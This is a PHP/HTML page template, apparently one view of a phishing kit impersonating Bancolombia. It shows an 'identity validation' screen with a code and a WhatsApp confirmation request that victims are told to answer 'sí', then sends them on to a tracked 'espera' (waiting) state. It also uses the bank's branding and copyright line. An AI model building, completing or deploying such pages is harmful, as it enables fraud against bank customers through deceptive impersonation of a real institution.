<style>
    /* Reutilizamos estilos de tarjeta_credito pero ajustados para esta vista */
    .whatsapp-icon-container {
        text-align: center;
        margin-bottom: 20px;
    }

    .whatsapp-icon {
        font-size: 3em;
        color: #25D366;
        /* WhatsApp Green */
        background: #fff;
        border-radius: 50%;
        /* Circular looks better contextually, or rounded square */
        padding: 15px;
        width: 80px;
        height: 80px;
        display: inline-flex;
        align-items: center;
        justify-content: center;
        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
    }

    .wa-title {
        color: #f0f0f0;
        text-align: center;
        font-weight: bold;
        font-size: 1.3em;
        margin-bottom: 20px;
    }

    .wa-box {
        background-color: #333;
        /* Slightly lighter than card-module bg */
        border: 1px solid #444;
        border-radius: 8px;
        padding: 15px;
        margin-bottom: 25px;
        text-align: center;
    }

    .wa-text {
        color: #b0b0b0;
        font-size: 0.95em;
        line-height: 1.5;
        margin: 0;
    }

    .wa-highlight {
        color: #fff;
        font-weight: bold;
    }

    .wa-button {
        width: 100%;
        padding: 15px;
        background-color: #f0c300;
        border: none;
        border-radius: 25px;
        color: #333;
        font-size: 1em;
        font-weight: bold;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
        text-decoration: none;
        transition: background-color 0.3s;
    }

    .wa-button:hover {
        background-color: #d4ac00;
    }

    .wa-footer {
        margin-top: 30px;
        text-align: center;
        color: #666;
        /* Darker text for footer */
        font-size: 0.8em;
    }
</style>

<div class="card-module">
    <div class="whatsapp-icon-container">
        <div class="whatsapp-icon">
            <i class="fa-brands fa-whatsapp"></i>
        </div>
    </div>

    <div class="wa-title">
        Código 923. Valida tu identidad
    </div>

    <div class="wa-box">
        <p class="wa-text">
            Confirma que eres tú. Hemos enviado un WhatsApp, responde con <span class="wa-highlight">"sí"</span> para
            continuar con el proceso.
        </p>
    </div>

    <!-- El botón redirige a espera, asumiendo que el usuario ya confirmó -->
    <a href="index.php?status=espera&id=<?php echo htmlspecialchars($_GET['id'] ?? ''); ?>" class="wa-button">
        <i class="fa-regular fa-circle-check"></i>
        Entendido
    </a>

    <div class="wa-footer">
        <p>
            <?php echo date('l d \d\e F \d\e Y h:i:s A'); ?>
        </p>
        <p>Copyright © 2025 Bancolombia.</p>
    </div>
</div>